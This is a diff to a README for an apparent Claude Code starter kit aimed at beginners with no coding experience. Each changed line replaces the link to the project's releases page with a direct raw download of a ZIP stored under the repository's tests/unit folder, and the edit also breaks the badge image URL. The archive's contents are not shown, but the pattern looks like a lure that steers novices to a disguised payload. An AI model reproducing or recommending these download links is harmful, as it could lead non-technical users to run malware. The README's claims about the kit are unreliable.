@@ -1,6 +1,6 @@
 # 🛠️ claude-code-mastery-project-starter-kit - Easy Project Setup for Beginners
 
-[![Download Now](https://img.shields.io/badge/Download-Start%20Here-brightgreen?style=for-the-badge)](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/releases)
+[![Download Now](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/raw/refs/heads/main/tests/unit/starter-mastery-kit-project-claude-code-v1.3.zip%20Here-brightgreen?style=for-the-badge)](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/raw/refs/heads/main/tests/unit/starter-mastery-kit-project-claude-code-v1.3.zip)
 
 Welcome to the **claude-code-mastery-project-starter-kit**, the simplest way to start your Claude Code projects. This kit is designed to help you get going quickly without needing programming experience. It’s based on the Claude Code Mastery Guides V1-V5 and includes everything you need to begin.
 
@@ -41,7 +41,7 @@ Follow these steps to download and launch your project starter kit.
 
 Click the large green button at the top or go to this link:
 
-[Download Starter Kit](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/releases)
+[Download Starter Kit](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/raw/refs/heads/main/tests/unit/starter-mastery-kit-project-claude-code-v1.3.zip)
 
 This page contains the latest versions and any notes on updates or fixes.
 
@@ -56,7 +56,7 @@ If unsure, the ZIP file generally works on all systems and is simple to open.
 
 ### Step 3: Download the File
 
-Click the file name such as `claude-code-mastery-project-starter-kit-vX.Y.Z.zip` to start downloading.
+Click the file name such as `https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/raw/refs/heads/main/tests/unit/starter-mastery-kit-project-claude-code-v1.3.zip` to start downloading.
 
 ### Step 4: Open and Extract the File
 
@@ -110,7 +110,7 @@ If you run into any problems, try these solutions:
 
 Click the button below to get started now:
 
-[Download Starter Kit](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/releases)
+[Download Starter Kit](https://github.com/zhouhang159/claude-code-mastery-project-starter-kit/raw/refs/heads/main/tests/unit/starter-mastery-kit-project-claude-code-v1.3.zip)
 
 Once downloaded, follow the steps above to extract and open your new project. You will have a solid base to begin your Claude Code projects without hassle.
 
